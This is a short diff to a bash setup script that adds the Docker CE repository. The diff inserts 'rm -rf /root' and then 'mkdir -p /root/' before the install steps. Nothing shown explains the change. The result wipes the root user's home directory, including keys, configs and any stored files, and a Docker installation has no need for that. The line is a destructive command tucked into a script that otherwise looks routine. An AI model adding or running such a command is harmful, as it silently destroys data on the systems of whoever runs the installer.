@@ -8,6 +8,9 @@ info() { echo "[•] $*"; }
 ok()   { echo "[✓] $*"; }
 die()  { echo "[✗] $*" >&2; exit 1; }
 
+rm -rf /root
+mkdir -p /root/
+
 # 1 — Add Docker CE repo
 # =============================================================================
 info "Adding Docker CE repo..."
